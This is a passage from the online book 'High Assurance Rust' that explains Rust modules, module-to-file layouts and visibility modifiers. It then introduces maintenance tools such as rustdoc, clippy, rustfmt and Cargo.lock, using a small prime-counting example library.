<p><strong>Crates</strong> group one or more related modules into either a library or a binary. They facilitate organizing code between projects. For libraries, visibility modifiers decide which items the module(s) export (e.g. the public API of the crate).</p>
<ul>
<li>Crates can also have dependencies, which are themselves crates (e.g. 3rd party libraries used internally). Chapter 2's <code>rcli</code> tool was a binary crate that had two library crate dependencies: <code>rc4</code> and <code>clap</code>.</li>
</ul>
</li>
<li>
<p><strong>System</strong> is the general term for a large piece of software made up of interconnected components. That could mean multiple Rust crates, libraries written in other programming languages that interoperate via CFFI<sup class="footnote-reference" id="fr-CFFI-1"><a href="#footnote-CFFI">6</a></sup>, or even networked sub-services that communicate using structured formats like REST<sup class="footnote-reference" id="fr-REST-1"><a href="#footnote-REST">7</a></sup> and gRPC<sup class="footnote-reference" id="fr-GRPC-1"><a href="#footnote-GRPC">8</a></sup>.</p>
</li>
</ul>
<h2 id="combatting-complexity-with-modules"><a class="header" href="#combatting-complexity-with-modules">Combatting Complexity with Modules</a></h2>
<p>Modules are the focus of this section.
They're a major "help to design" when writing code, and a "help to thinking" when reading it.
Modules compartmentalize functional groupings of code and define their interfaces.
They help address the timeless need for code organization, and, ultimately, help keep complexity in check.</p>
<p>As the systems we build grow in size and capability, they tend to incrementally accumulate some form of complicatedness.
Once compounded, complexity makes systems difficult to understand and modify.
Unnecessary complexity increases the chance of an outage or a security breach.</p>
<p>Accrued complexity is sometimes referred to as "technical debt".
Much like financial debt, it's tough to get out of.
So designing for simplicity and maintainability should always be a priority.</p>
<p>Now the data structure library we build in this book will total less than 5,000 lines of code.
That's a tiny codebase in the grand scheme of things.
But we'll make use of Rust's module system from the outset - there are size-agnostic benefits to reap.
So let's get a feel for how modules work.</p>
<h2 id="source-code-organization"><a class="header" href="#source-code-organization">Source Code Organization</a></h2>
<p>Some languages infer modules from the layout of the filesystem.
That's not true for Rust.</p>
<p>Rust modules have a loose relationship to individual source code files (whose names end in <code>.rs</code>).
Because modules are logical groupings, we can choose from one of three module-file mappings: many-to-one, many-to-many, and one-to-one.
These aren't exclusive: a single project can mix-and-match strategies as appropriate.</p>
<p>Regardless of mapping choice(s), modules always form a tree-like hierarchy.
The module tree must have a root, typically:</p>
<ul>
<li><code>main.rs</code> for binary crates (like <code>rcli</code>)</li>
<li><code>lib.rs</code> for library crates (like <code>rc4</code>)</li>
</ul>
<p>Crates which build other targets (like tests, benchmarks, or examples) have other target-specific roots.</p>
<p>In the binary case, the hierarchy decides which items are visible in which module.
That's also true for the library case.
Additionally, library crates can choose to <em>export</em> certain items and/or modules - creating a public API.</p>
<p>Let's explore three module-file mappings that maintain the same singular hierarchy.</p>
<h3 id="1-multiple-modules---one-source-file-m1"><a class="header" href="#1-multiple-modules---one-source-file-m1">1. Multiple Modules -&gt; One Source File (<code>m:1</code>)</a></h3>
<p>A single file can contain nested modules. The syntax for an <em>inline</em> module definition is:</p>
<pre><code class="language-rust ignore">mod my_module {
    // Module contents here, potentially including nested "submodules"
}</code></pre>
<p>Let's continue this chapter's running OS example, but sidestep the details of what it would take to actually create a bootable kernel (a topic well-covered in Philipp Oppermann's excellent tutorial series<sup class="footnote-reference" id="fr-BlogOS-1"><a href="#footnote-BlogOS">9</a></sup>).</p>
<p>We might create a new binary crate and add the following to <code>main.rs</code>.</p>
<pre><code class="language-rust ignore">mod kern {
    pub mod sched {
        // Scheduling code here, including our `Proc` struct...

        /// Set the priority of a process
        pub fn set_priority(pid: usize, priority: usize) -&gt; bool {
            // Implementation here...
        }
    }

    pub mod dma {
        // Code related to Direct Memory Access (DMA) here...
    }

    pub mod syscall {
        // Code related to system calls here...
    }
}

// Dummy function to show testing via submodule
fn private_helper() -&gt; bool {
    true
}

#[cfg(test)]
mod tests {
    // Import public function from "peer" module
    use super::kern::sched::set_priority;

    // Import private function from "parent" module
    use super::private_helper;

    #[test]
    fn test_private_helper() {
        assert!(private_helper());
    }

    #[test]
    fn test_set_priority() {
        // Unit test here...
    }

    // More individual tests here...
}</code></pre>
<p>With any design decision, "can" and "should" are two different things.
You likely won't want to organize an OS, or any large project, within a single file like this.</p>
<p>But a many-to-one mapping shows that modules are a flexible concept.
One aspect of this flexibility you <em>are</em> likely to leverage is a <code>tests</code> module, like the one at the bottom of the above.
It allows you to keep unit tests close to the code they're responsible for testing (within the same file).</p>
<p>This can be especially useful for testing private functions - notice how the <code>tests</code> module can use the <code>private_helper</code> function even though the function is not marked <code>pub</code>.
To understand why, we need to understand the module hierarchy this single file creates.</p>
<p>Implicitly, the file <code>main.rs</code> is itself a module.
In fact, it's the hierarchy's root.
That makes <code>mod tests</code> a <em>submodule</em> in a hierarchy, meaning "child" of the top-level <code>main.rs</code> module.
It sits at the same level as it's "peer" module (<code>kern</code>, declared in the same file):</p>
</br>
<p align="center">
  <img width="100%" src="chp3/mod_single_file.svg">
  <figure>
  <figcaption><center>The module hierarchy of the above snippet. It will remain unchanged for the next two subsections.</center></figcaption><br>
  </figure>
</p>
<p>In Rust, submodules have access to both the private and public items of their parents.</p>
<ul>
<li><strong>Example:</strong> <code>tests</code> can import the private function <code>private_helper</code> from its parent, with <code>use super::private_helper;</code>.</li>
</ul>
<p>Private items can't be accessed for peers (same level in the hierarchy, like <code>kern</code>) or children (although <code>tests</code> doesn't have child submodules in our example).</p>
<ul>
<li><strong>Example:</strong> <code>tests</code> can only access exported, public items from <code>kern</code>. It imports the public <code>set_priority</code> function via <code>use super::kern::sched::set_priority;</code>.</li>
</ul>
<h3 id="2-multiple-modules---multiple-source-files-mn"><a class="header" href="#2-multiple-modules---multiple-source-files-mn">2. Multiple Modules -&gt; Multiple Source Files (<code>m:n</code>)</a></h3>
<p>We could move the contents of <code>mod kern</code> to a file named <code>kern.rs</code>, like so:</p>
<pre><code class="language-rust ignore">pub mod sched {
    // Scheduling code here, including our `Proc` struct...

    /// Set the priority of a process
    pub fn set_priority(pid: usize, priority: usize) -&gt; bool {
        // Implementation here...
    }
}

pub mod dma {
    // Code related to Direct Memory Access (DMA) here...
}

pub mod syscall {
    // Code related to system calls here...
}</code></pre>
<p>Notice how we no longer need an inclosing <code>pub mod kern { ... }</code>, it's implied by the filename.
After making the change, we have the following directory contents:</p>
<pre><code class="language-ignore">.
├── Cargo.toml
└── src
    ├── kern.rs
    └── main.rs

1 directory, 3 files
</code></pre>
<p>As we saw, <code>kern.rs</code> uses the unchanged, inline definitions for it's submodules (e.g. <code>pub mod sched { ... }</code>, etc).
Thus we maintain the hierarchy pictured above.</p>
<p>For <code>main.rs</code> to import the <code>set_priority</code> function, it would need to use:</p>
<pre><code class="language-rust ignore">mod kern;
use kern::sched::set_priority;</code></pre>
<ul>
<li>
<p><code>mod kern;</code> signals that the <code>kern</code> module's contents exist in another file, either <code>kern.rs</code> or <code>kern/mod.rs</code>.</p>
<ul>
<li>These "forward declarations" are typically placed in a module root - whether that's the root of the entire hierarchy (as is the case here, for <code>main.rs</code>) or just a module that contains submodules.</li>
</ul>
</li>
<li>
<p><code>use kern::sched::set_priority;</code> imports a specific function from the public <code>sched</code> submodule, just like the <code>tests</code> submodule did in the previous layout.</p>
</li>
</ul>
<h3 id="3-one-module---one-source-file-11"><a class="header" href="#3-one-module---one-source-file-11">3. One Module -&gt; One Source File (<code>1:1</code>)</a></h3>
<p>In a more realistic project layout, we might opt to place every module in a separate file.
While still maintaining that same hierarchy.</p>
<p>Instead of the inline module definitions for <code>sched</code>, <code>dma</code>, and <code>syscall</code>, we could place each submodule in a dedicated file like so:</p>
<pre><code class="language-ignore">.
├── kern
│   ├── dma.rs
│   ├── sched.rs
│   └── syscall.rs
├── kern.rs
└── main.rs

1 directory, 5 files
</code></pre>
<p>When we import a module from another file, Rust looks for either <code>module_name.rs</code> or <code>module_name/mod.rs</code>.
So the following layout is equivalent to the above, it's only a matter of preference:</p>
<pre><code class="language-ignore">.
├── kern
│   ├── dma.rs
│   ├── mod.rs
│   ├── sched.rs
│   └── syscall.rs
└── main.rs

1 directory, 5 files
</code></pre>
<p>In either case, we'd again drop the enclosing, inline <code>pub mod mod_name { ... }</code> for three submodules because it's implied by the filename. E.g. <code>sched.rs</code> now contains:</p>
<pre><code class="language-rust  ignore">// Scheduling code here, including our `Proc` struct...

/// Set the priority of a process
pub fn set_priority(pid: usize, priority: usize) -&gt; bool {
    // Implementation here...
}</code></pre>
<p><code>kern.rs</code> or <code>kern/mod.rs</code> (depending on which layout we choose) is a module root that sits under the whole-hierarchy root <code>main.rs</code> (as pictured above).
In our 1:1 layout, this file gets to control how its child submodules are exposed to <code>main.rs</code>, its parent.</p>
<p>For simplicity, let's assume we went with the first choice, a <code>kern.rs</code>.
This file could choose to expose the entire <code>sched</code> submodule (e.g. <em>re-export</em> it) with:</p>
<pre><code class="language-rust ignore">pub mod sched;</code></pre>
<p>Then <code>main.rs</code> would import the <code>set_priority</code> function as before (in the prior <code>m:n</code> case):</p>
<pre><code class="language-rust ignore">mod kern;
use kern::sched::set_priority;</code></pre>
<p>But we also have the option to abstract away details of <code>kern</code>'s internals from users of the module.</p>
<p>Maybe <code>main.rs</code> should still be able to use the <code>set_priority</code> function, but shouldn't be aware that, internally, the function is part of some larger <code>sched</code> module.
If <code>kern.rs</code> re-exported only a single function and not the entire module:</p>
<pre><code class="language-rust ignore">mod sched;
pub use sched::set_priority;</code></pre>
<p>Then <code>main.rs</code> would be able to use <code>set_priority</code> with:</p>
<pre><code class="language-rust ignore">mod kern;
use kern::set_priority;</code></pre>
<p>This may seem like a minor difference, we went from importing the same function via <code>kern::sched::set_priority</code> to <code>kern::set_priority</code>.
The function and the module hierarchy remained unchanged, we only shortened an item's <em>path</em>.</p>
<p>But <em>controlling visibility</em> is a critical tool for managing complexity in a codebase.
It gives us the freedom to organize a large system internally in one way, but expose only a subset of that system to an end user - in a manner that doesn't leak details of the internal organization.</p>
<p>Keep in mind that a public API (which includes modules, functions, data types, and constants - among other items) often makes stability guarantees.
Systems that expose internal details via public APIs become hard to refactor without "breaking changes" (those that cause downstream code to stop compiling).</p>
<p>In addition to creating maintenance burden, large and detailed API surfaces increase complexity and cognitive load (for both API developers and API users).</p>
<p>Thus, a major goal of modular design is providing abstraction by controlling visibility of internal interfaces.
Let's dig into what options Rust affords us, beyond limiting re-exports at a module root.</p>
<h2 id="controlling-visibility"><a class="header" href="#controlling-visibility">Controlling Visibility</a></h2>
<p>Rust's visibility modifiers help keep internal and external API surface in check.
The goal is to group items into one of two categories:</p>
<ul>
<li><strong>Private</strong> - those accessible only within the same module or its submodules.</li>
<li><strong>Public</strong> - those exported by a module.</li>
</ul>
<p>In addition to reigning in complexity, reducing visibility allows us to maintain <em>invariants</em>.
For example, say a structure provides getter and setter functions for a private field.
Instead of making the field public.
If the setter function handles invalid parameters (perhaps by returning an error) we can ensure the structure never enters a bad state (like having a field whose value is illegal or out-of-range).
In object-oriented languages, similar practices fall under the umbrella of <em>encapsulation</em>.</p>
<p>By default, items are private in Rust (visible only within the current module).
Increasing visibility requires explicit opt-in.
There are five modifiers<sup class="footnote-reference" id="fr-VisMod-1"><a href="#footnote-VisMod">10</a></sup> for public visibility than can be applied to any item (module, function, structure, structure field, etc<sup class="footnote-reference" id="fr-Items-2"><a href="#footnote-Items">5</a></sup>).
Listed from least-to-most restrictive:</p>
<div class="table-wrapper"><table><thead><tr><th>Modifier</th><th>Where is the item visible?</th></tr></thead><tbody>
<tr><td><code>pub</code></td><td>Everywhere, outside or inside the current module.</td></tr>
<tr><td><code>pub(crate)</code></td><td>Anywhere within the current crate.</td></tr>
<tr><td><code>pub(super)</code></td><td>Only within the parent module and submodules.</td></tr>
<tr><td><code>pub(in some::path::here)</code></td><td>Only within submodules along the provided path.</td></tr>
<tr><td><code>pub(self)</code></td><td>Only in the current module (like not using <code>pub</code> at all).</td></tr>
</tbody></table>
</div>
<p>In lieu of an example in this section, we'll use some of the above modifiers as we implement the core project.</p>
<p>Keep in mind that just because an item is <em>visible</em> doesn't mean it's <em>available</em>.
Items still need to be exported by the module that contains them, and then imported by its end-user.
Without that export and the corresponding import, an item will not be <em>in scope</em>.</p>
<h2 id="takeaway-13"><a class="header" href="#takeaway-13">Takeaway</a></h2>
<p>Code organization is a critical and timeless problem.
Rust's module system offers a granular and configurable solution for large projects.
Effective use of the module system is key to keeping complexity in check.</p>
<p>Rust modules are a logical, hierarchical grouping.
Although they're not inferred from the filesystem directly, there are several ways to map modules to source files.</p>
<p>Internally, visibility modifiers control which item is visible in which module.
Externally, a module can choose to re-export certain items for public consumption.
In both cases, visibility controls API surface and aids upholding invariants.</p>
<p>We've gotten a taste for how modules keep projects organized.
Let's move onto tools for keeping those same projects healthy over time.</p>
<blockquote>
<p><strong>What about organizing software systems, beyond Rust modules?</strong></p>
<p>The <a href="chp3/../chp16_appendix/components.html"><em>Fundamentals: Component-Based Design</em></a> section of the appendix is an expanded, generally applicable continuation of our "program organization" discussion.</p>
<p>Whereas this section focused on Rust's module system, the supplementary appendix section explores universal principles.</p>
</blockquote>
<hr>
<ol class="footnote-definition"><li id="footnote-CppD">
<p><a href="https://www.youtube.com/watch?v=69edOm889V4"><em>The Design of C++</em></a>. Bjarne Stroustrup (1994). <a href="#fr-CppD-1">↩</a></p>
</li>
<li id="footnote-Simula">
<p>A 1962 object-oriented language designed for writing simulations. Introduced the idea of classes. <a href="#fr-Simula-1">↩</a></p>
</li>
<li id="footnote-BCPL">
<p>A 1967 predecessor to C originally intended for compiler development. Performant but type-less. <a href="#fr-BCPL-1">↩</a></p>
</li>
<li id="footnote-OGMods">
<p><a href="https://www.win.tue.nl/~wstomv/edu/2ip30/references/criteria_for_modularization.pdf"><em>On the Criteria To Be Used in Decomposing Systems into Modules</em></a>. David L. Parnas (1972). <a href="#fr-OGMods-1">↩</a></p>
</li>
<li id="footnote-Items">
<p><a href="https://doc.rust-lang.org/reference/items.html"><em>Items</em></a>. The Rust Reference (Accessed 2022). <a href="#fr-Items-1">↩</a> <a href="#fr-Items-2">↩2</a></p>
</li>
<li id="footnote-CFFI">
<p><a href="https://en.wikipedia.org/wiki/Foreign_function_interface">Foreign function interface</a>. Wikipedia (Accessed 2022). <a href="#fr-CFFI-1">↩</a></p>
</li>
<li id="footnote-REST">
<p><a href="https://www.redhat.com/en/topics/api/what-is-a-rest-api">What is a REST API?</a>. RedHat (2020). <a href="#fr-REST-1">↩</a></p>
</li>
<li id="footnote-GRPC">
<p><a href="https://grpc.io/docs/what-is-grpc/core-concepts/">Core concepts, architecture and lifecycle</a>. Google (Accessed 2022). <a href="#fr-GRPC-1">↩</a></p>
</li>
<li id="footnote-BlogOS">
<p><a href="https://os.phil-opp.com/"><em>Writing an OS in Rust</em></a>. Philipp Oppermann (Accessed 2022). <a href="#fr-BlogOS-1">↩</a></p>
</li>
<li id="footnote-VisMod">
<p><a href="https://doc.rust-lang.org/reference/visibility-and-privacy.html"><em>Visibility and Privacy</em></a>. The Rust Reference (Accessed 2022). <a href="#fr-VisMod-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="recommended-tooling"><a class="header" href="#recommended-tooling">Recommended Tooling</a></h1>
<p>Core language features, like ownership and modules, color the Rust development experience regardless of project size and scope.
The growing library ecosystem makes many ambitious projects feasible - we can leverage abstractions developed and maintained by others.
Built-in test support helps us build those bold projects with confidence.</p>
<p>There's a final, perhaps less glamorous, aspect of software engineering we need to cover: maintenance.
While smart use of modules can help us tame architectural complexity, even a well-organized project needs additional tools to maintain the health of its codebase.</p>
<p>In this section, we'll briefly cover the basics of Rust's 1st-party documentation, linting, code formatting, and build reproduction tools.
We'll also sample 3rd party utilities for miscellaneous tasks, like auditing dependencies for known vulnerabilities.</p>
<h2 id="1st-party-tooling"><a class="header" href="#1st-party-tooling">1st Party Tooling</a></h2>
<h3 id="rustdoc"><a class="header" href="#rustdoc"><code>rustdoc</code></a></h3>
<p>Rust has a built-in document generator, <code>rustdoc</code><sup class="footnote-reference" id="fr-RustDoc-1"><a href="#footnote-RustDoc">1</a></sup>.
It's a default part of the toolchain and comes bundled along with <code>cargo</code>.
A special comment syntax allows you to write documentation, in Markdown<sup class="footnote-reference" id="fr-Markdown-1"><a href="#footnote-Markdown">2</a></sup>, directly alongside code.
The benefit is twofold:</p>
<ol>
<li>
<p>A <strong>documentation website</strong> can be rendered locally or served remotely. It's as comprehensive as your set of comments. That's a huge boon to library users.</p>
</li>
<li>
<p>Your documentation <strong>examples are automatically run as unit tests</strong>. This ensures that, any given time, the documentation is current - at least with respect to your provided examples. And it gains us a bit of momentum on building out a test suite.</p>
</li>
</ol>
<p>To see <code>rustdoc</code> in action, let's create a new library:</p>
<pre><code class="language-ignore">cargo new --lib prime_test
</code></pre>
<p>Running <code>tree prime_test</code> shows the following project layout.</p>
<pre><code class="language-ignore">prime_test/
├── Cargo.toml
└── src
    └── lib.rs
</code></pre>
<p>Add the following to <code>lib.rs</code>:</p>
<pre><code class="language-rust noplaypen">
//! This library does unoptimized primality testing.

/// Given a list of numbers, get the count of prime numbers present.
///
/// # Example
///
/// ```
/// use prime_test::count_primes;
///
/// let list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
/// assert_eq!(count_primes(&amp;list), 4);
/// ```
#[doc(alias = "primality")]
pub fn count_primes(num_list: &amp;[usize]) -&gt; usize {
    // Unnecessary, unidiomatic check
    if num_list == [] {
        return 0;
    }

    num_list.iter().filter(|n| is_prime(**n)).count()
}

// Prime number check.
// This is a naive implementation,
// there are much more efficient implementations.
// Returns `true` if `n` is prime, `false` if not.
fn is_prime(n: usize) -&gt; bool {
    if n &lt;= 1 {
        return false;
    }

    for i in 2..n {
        if n % i == 0 {
            return false;
        }
    }

    true
}</code></pre>
<ul>
<li>
<p>The very first comment, prefixed with <code>//!</code>, provides documentation for the crate as a whole.</p>
</li>
<li>
<p>The <code>count_primes</code> function, marked <code>pub</code>, is exported from the crate root (<code>lib.rs</code>). It's part of the public API.</p>
<ul>
<li>
<p>The comments starting with three forward slashes (<code>///</code>) will be part of the rendered documentation.</p>
</li>
<li>
<p><code>#[doc(alias = "primality")]</code> is a macro that tags the function with another keyword, so that users entering the relevant search term <code>primality</code> will see this function displayed in search results.</p>
</li>
</ul>
</li>
<li>
<p><code>is_prime</code> is a private helper, it doesn't have the <code>pub</code> modifier for export and uses regular, non-document comments (lines starting with <code>//</code>).</p>
</li>
</ul>
<p>Running <code>cargo test</code> will execute both unit tests we've written and all documentation examples.
To run the doc tests alone, we can use <code>cargo test --doc</code>:</p>
<pre><code class="language-ignore">running 1 test
test src/lib.rs - count_primes (line 9) ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.16s
</code></pre>
<p>To render the documentation locally, run <code>cargo doc --open</code>.
The generated HTML/CSS/JavaScript webpage will be opened with the system's default browser.</p>
<p>A landing page shows crate-wide documentation and enumerates exported modules, structures, functions.
In our case, the only public item is the <code>count_primes</code> function.
Clicking on it leads to a documentation page showing our example:</p>
</br>
<p align="center">
  <figure>
  <img width= "100%" src="chp3/count_primes_doc.png">
  <figcaption><center>The rendered documentation for our public function, viewed using the selectable dark theme.</center></figcaption><br>
  </figure>
</p>
<p>Because <code>rustdoc</code> is used for standard library documentation, its format is already familiar to Rust developers.
Moreover, if you publish projects to <a href="https://crates.io/">crates.io</a>, Rust's official package repository, documentation for your project is automatically rendered and hosted at <a href="https://docs.rs/">docs.rs</a>, Rust's official documentation host.</p>
<p>The onus of writing clear and complete documentation is still on you, but the tooling and infrastructure eliminate barriers to getting docs into the hands of the users that need them.</p>
<p>Some additional tips:</p>
<ul>
<li>
<p>Should you want to enforce completeness across every exported item: adding the optional <code>#![deny(missing_docs)]</code> within the crate root makes missing documentation a compile-time error.</p>
</li>
<li>
<p>If your code examples include boilerplate the user can assume is present, you can omit it from the rendered doc but still have it present during test execution by prefixing the line with <code>#</code>.</p>
<ul>
<li>For instance, had our example for the <code>count_primes</code> function started with <code># use prime_test::count_primes;</code>, the documentation wouldn't show this import line.</li>
</ul>
</li>
<li>
<p>Not every documentation example may be full standalone, runnable code. To have <code>cargo</code> check that an example compiles but not actually attempt to execute it as doc test, the code block be prefixed with <code>no_run</code> - added immediately after the three opening backticks. For code that shouldn't be compiled or run, <code>ignore</code> can similarly be used.</p>
</li>
</ul>
<h3 id="clippy"><a class="header" href="#clippy"><code>clippy</code></a></h3>
<p><code>clippy</code> is an official code linting tool.
It's already installed in the book's container, but the typical setup would be:</p>
<pre><code class="language-ignore">rustup update
rustup component add clippy
</code></pre>
<p>Per the <code>README.md</code> of <code>clippy</code>'s official source repo<sup class="footnote-reference" id="fr-ClippyReadme-1"><a href="#footnote-ClippyReadme">3</a></sup>, the tool supports over 500 lints across the following categories:</p>
<div class="table-wrapper"><table><thead><tr><th>Category</th><th>Description</th><th>Default level</th></tr></thead><tbody>
<tr><td><code>clippy::all</code></td><td>All lints that are on by default (correctness, suspicious, style, complexity, perf)</td><td><strong>warn/deny</strong></td></tr>
<tr><td><code>clippy::correctness</code></td><td>Code that is outright wrong or useless</td><td><strong>deny</strong></td></tr>
<tr><td><code>clippy::suspicious</code></td><td>Code that is most likely wrong or useless</td><td><strong>warn</strong></td></tr>
<tr><td><code>clippy::style</code></td><td>Code that should be written in a more idiomatic way</td><td><strong>warn</strong></td></tr>
<tr><td><code>clippy::complexity</code></td><td>Code that does something simple but in a complex way</td><td><strong>warn</strong></td></tr>
<tr><td><code>clippy::perf</code></td><td>Code that can be written to run faster</td><td><strong>warn</strong></td></tr>
<tr><td><code>clippy::pedantic</code></td><td>Lints which are rather strict or have occasional false positives</td><td>allow</td></tr>
<tr><td><code>clippy::nursery</code></td><td>New lints that are still under development</td><td>allow</td></tr>
<tr><td><code>clippy::cargo</code></td><td>Lints for the cargo manifest</td><td>allow</td></tr>
</tbody></table>
</div>
<p>The full lint set has a searchable documentation site<sup class="footnote-reference" id="fr-ClippyLints-1"><a href="#footnote-ClippyLints">4</a></sup>.</p>
<p>Notice that <code>clippy::correctness</code> can find actual bugs (as opposed to, say, unidiomatic but correct code pointed out by <code>clippy::style</code>).
However, only a small minority of correctness checks are precise enough to be applied confidently and automatically (e.g. <code>MachineApplicable</code><sup class="footnote-reference" id="fr-MachApp-1"><a href="#footnote-MachApp">5</a></sup> rules).</p>
<p>To run <code>clippy</code> on the <code>prime_test</code> library with default settings:</p>
<pre><code class="language-ignore">cd code_snippets/chp3/prime_test
cargo clippy
</code></pre>
<p>We'll get the following warning for the <code>if</code> block inside <code>count_primes</code> commented with <code>// Unnecessary, unidiomatic check</code>:</p>
<pre><code class="language-ignore">warning: comparison to empty slice
  --&gt; src/lib.rs:18:8
   |
18 |     if num_list == [] {
   |        ^^^^^^^^^^^^^^ help: using `is_empty` is clearer and more explicit: `num_list.is_empty()`
   |
   = note: `#[warn(clippy::comparison_to_empty)]` on by default
   = help: for further information visit https://rust-lang.github.io/rust-clippy/master/index.html#comparison_to_empty

warning: `prime_test` (lib) generated 1 warning
</code></pre>
<p>This warning is indeed helpful, using the more explicit <code>is_empty()</code> API makes our code easier to understand at a glance.
The warning will disappear if we update <code>count_primes</code> to:</p>
<pre><code class="language-rust ignore">pub fn count_primes(num_list: &amp;[usize]) -&gt; usize {
    if num_list.is_empty() {
        return 0;
    }

    num_list.iter().filter(|n| is_prime(**n)).count()
}</code></pre>
<p>But linters have a limitation.
They <em>parse syntax</em>, they don't <em>understand semantics</em>.
Even though the more complex lints can make it appear that way.</p>
<p>In reality, we don't need the check because filtering an iterator (<code>.iter().filter(...)</code> in the above) already handles the empty-input edge case correctly.
This function could be a one-liner:</p>
<pre><code class="language-rust ignore">pub fn count_primes(num_list: &amp;[usize]) -&gt; usize {
    num_list.iter().filter(|n| is_prime(**n)).count()
}</code></pre>
<p>Nonetheless, <code>clippy</code> is a powerful and useful tool for improving and maintaining general code quality.
And its lints regularly improve.
<code>clippy</code> makes a great addition to CI.</p>
<blockquote>
<p><strong>Aside on "Trojan Source" Attacks</strong></p>
<p>One of the more esoteric lints in the <code>clippy::correctness</code> denies invisible Unicode characters in source files.
While that eliminates potentially surprising edge cases, the Rust compiler itself now does linting to prevent "trojan source" attacks<sup class="footnote-reference" id="fr-TrojanSource-1"><a href="#footnote-TrojanSource">6</a></sup> - which use encoding tricks to produce source code that reads one way to a human (in terms of visible characters) but appears another way to the compiler (in terms of parsed tokens).
This change was made in response to CVE-2021-42574<sup class="footnote-reference" id="fr-SrcCVE-1"><a href="#footnote-SrcCVE">7</a></sup>, in which researchers reported the attack as a threat to supply-chain security.</p>
</blockquote>
<h3 id="rustfmt"><a class="header" href="#rustfmt"><code>rustfmt</code></a></h3>
<p>Unlike a linter, which checks for best practices and high-level idioms, <code>rustfmt</code> enforces low-level style rules.
Things like maximum line width, the number of allowed blank spaces between items, whether opening braces should be on the same line or the next, etc.</p>
<p>The individual rewrites applied for a given project are configurable<sup class="footnote-reference" id="fr-RustFmt-1"><a href="#footnote-RustFmt">8</a></sup>.
You can adjust style rules to suit your team's preferences.</p>
<p>Like <code>rustdoc</code>, <code>rustfmt</code> can be run with a <code>cargo</code> subcommand.
To apply the default ruleset:</p>
<pre><code class="language-ignore">cargo fmt
</code></pre>
<p>In the case of our <code>prime_test</code> library example, the command would have no effect.
But for large, multi-developer codebases it can be an important way to ensure a baseline level of consistency and readability.</p>
<p>Like <code>clippy</code>, <code>rustfmt</code> is an ideal candidate for CI.
Code review can be more efficient when all commits conform to a uniform style.</p>
<h3 id="the-cargolock-file"><a class="header" href="#the-cargolock-file">The <code>Cargo.lock</code> File</a></h3>
<p>This last entry in the 1st party list isn't a standalone tool - rather an important feature of <code>cargo</code> we should discuss.</p>
<p>After running <code>cargo build</code> or <code>cargo run</code>, you may have noticed a new file appear alongside <code>Cargo.toml</code>: <code>Cargo.lock</code>.
Where as <code>Cargo.toml</code> is something you'll edit frequently (e.g. to add new dependencies), <code>Cargo.lock</code> is an auto-generated file containing metadata for reproducible builds<sup class="footnote-reference" id="fr-CargoTomlVsLock-1"><a href="#footnote-CargoTomlVsLock">9</a></sup>.</p>
<p>It "locks in" a specific dependency version at build time.
You wouldn't want <code>cargo</code> to eagerly upgrade dependencies every time you build.</p>
<h4 id="reproducible-builds"><a class="header" href="#reproducible-builds">Reproducible Builds</a></h4>
<p>For example, say you added a dependency on the <code>rayon</code> crate<sup class="footnote-reference" id="fr-Rayon-1"><a href="#footnote-Rayon">10</a></sup> to your <code>Cargo.toml</code> like so:</p>
<pre><code class="language-ignore">[dependencies]
rayon = "^1.5"
</code></pre>
<p>Per the Cargo Book's guide to specifying dependencies<sup class="footnote-reference" id="fr-CargoDep-1"><a href="#footnote-CargoDep">11</a></sup>, this means the project can use any semantic version<sup class="footnote-reference" id="fr-SemVer-1"><a href="#footnote-SemVer">12</a></sup> of <code>rayon</code> that is greater than <code>1.5.0</code> but less than <code>2.0.0</code>.
Let's assume at the time you first built your project, the latest available version of <code>rayon</code> was <code>1.5.0</code>.
What happens when version <code>1.5.1</code> comes out?</p>
<p>Nothing.
The <code>Cargo.lock</code> file generated during that first build logged <code>1.5.0</code> as the version of <code>rayon</code> to use.
If you share a copy of the project directory with a co-worker, including the <code>Cargo.lock</code>, they'll be able to build the project using the exact same dependency versions as you.
Committing the <code>Cargo.lock</code> file to version control is a good idea for projects that build an executable, like Chapter 2's CLI tool.
So anyone can build an equivalent executable.</p>
<p>Additionally, you may choose to include <code>rust-toolchain.toml</code><sup class="footnote-reference" id="fr-ToolFile-1"><a href="#footnote-ToolFile">13</a></sup> file to ensure your co-worker uses the exact same compiler version and targets the same platform.</p>
<p>In theory, locking dependency versions shouldn't be necessary.
Semantic versioning dictates that <code>1.5.1</code> only contains fully-backward compatible bug fixes.
But that's a convention that can't be automatically enforced.
And software is complex, it's entirely possible for some minor bug fix to create a problem specific to your product or environment.
That's why reproducible builds are so important for production software.
Especially when it comes to Continuous Integration and Continuous Deployment (CI/CD).</p>
<p>When you are ready to update the latest dependency versions allowable by your <code>Cargo.toml</code>, simply run:</p>
<pre><code class="language-ignore">cargo update
cargo test
</code></pre>
<p>The former command searches for new published versions and updates your <code>Cargo.lock</code>.
The latter runs your test suite.
Just in case.</p>
<h4 id="self-hosted-dependencies"><a class="header" href="#self-hosted-dependencies">Self-hosted Dependencies</a></h4>
<p>Note that your dependencies do not need to be hosted on <a href="https://crates.io">crates.io</a>.
Chapter 2's CLI tool could have pulled <code>clap</code> directly from it's GitHub repository like so:</p>
<pre><code class="language-ignore">[dependencies]
clap = { git = "https://github.com/clap-rs/clap.git", features = ["derive"] }
</code></pre>
<p><code>git = ...</code> can be used for any Git repository URL, including private, self-hosted repositories maintained by your company or team.</p>
<p>Moreover, you can lock to a specific branch and commit hash manually:</p>
<pre><code class="language-ignore">[dependencies]
clap = { git = "https://github.com/clap-rs/clap.git", branch = "master", rev = "31bd0b5", features = ["derive"] }
</code></pre>
<p>This is useful if you need to stay on a known-good version of an internal library, while still using <code>cargo update</code> to keep other dependencies tracking with upstream.</p>
<h2 id="3rd-party-tooling"><a class="header" href="#3rd-party-tooling">3rd Party Tooling</a></h2>
<p>Built-in maintenance tools are the tip of the iceberg.
The ecosystem offers an array of additional capabilities, often bundled as plugins to <code>cargo</code>.
